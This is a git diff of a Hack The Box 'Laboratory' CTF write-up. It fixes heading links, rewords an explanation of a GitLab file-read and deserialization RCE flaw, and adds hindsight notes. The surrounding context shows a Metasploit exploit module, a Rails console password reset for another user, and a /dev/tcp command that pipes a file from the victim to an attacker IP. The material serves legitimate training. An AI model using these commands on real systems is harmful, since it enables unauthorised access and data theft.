@@ -2,11 +2,11 @@
 
 ## Table of Contents
 - [Machine Information](#machine-information)
-- [Information Gathering and Enumeration](#information-gathering-and-enuemration)
-	- [laboratory.htb](#laboratory.htb-domain)
-	- [git.laboratory.htb](#git.laboratory.htb-domain)
+- [Information Gathering and Enumeration](#information-gathering-and-enumeration)
+	- [laboratory.htb](#laboratoryhtb-domain)
+	- [git.laboratory.htb](#gitlaboratoryhtb-domain)
 - [Exploitation](#exploitation)
-- [Privilege Escalation](privilege-escalation)
+- [Privilege Escalation](#privilege-escalation)
 	- [Docker to Low Privileged Shell](#docker-to-low-privileged-shell)
 	- [Low Privileged Shell to Root Shell](#low-privileged-shell-to-root-shell)
 
@@ -86,7 +86,7 @@ At first, I tried to skim through the source code and tried running the script b
 So basically this vulnerability happens when moving an issue from one project to another. So what we could do is to create 2 projects ( repos ) and create a dummy issue on one of them with a specific payload in the `description`. We are then going to move that issue to the second project and it will link a file that we specified to read in the payload.
 
 The file read vulnerability is caused by **unsanitized** input when moving files that causes a `directory traversal` and `arbitrary file read` vulnerability. 
-The RCE vulnerability can be achieved by creating a `serialized` session hash that will be sent to the server and be executed upon the deserialization of the object with some `ruby on rails` magic.
+The RCE vulnerability can be achieved by creating a `serialized` session hash that will be sent to the server via cookie and be executed upon the deserialization of the object.
 You can read more about it [here](https://hackerone.com/reports/827052) and [here](https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/)
 
 Now let's craft this exploit. First of all we're going to need 2 dummy projects. 
@@ -160,6 +160,7 @@ Do the exact same thing that we did when reading `/etc/passwd` and we should be 
 ![secret-key](./img/secret-key.png)
 
 Now that we have the secret key, we could try RCE next. But to do this manually, we would need to install `ruby on rails` and that might conflict with `metasploit` that is also written in `ruby`, so I spun up `metasploit` and found this exact exploit.
+>**NOTE: We could've used docker to create a GitLab instance so it won't conflict with metasploit and create our serialized object to gain RCE via the cookie. This didn't occur to me when solving this box.**
 
 ```
 use exploit/multi/http/gitlab_file_read_rce
@@ -215,6 +216,7 @@ Let's also change the password.
 user.password = 'password'
 user.save
 ```
+>**NOTE: We could have just changed our user `test` to become admin and access `dexter`'s project using the Admin Area. I didn't know this when solving this box.**
 
 ![rails-console](./img/rails-console.png)
 
@@ -264,6 +266,7 @@ On the victim box, let's cat out this binary redirect the output to our machine.
 ```bash
 cat /usr/local/bin/docker-security > /dev/tcp/10.10.16.5/9002
 ```
+>**NOTE: We could've used `ltrace` to inspect this binary.**
 
 Let's also make sure that the `md5sum` of both the binary on the box and our local machine are the same.
 
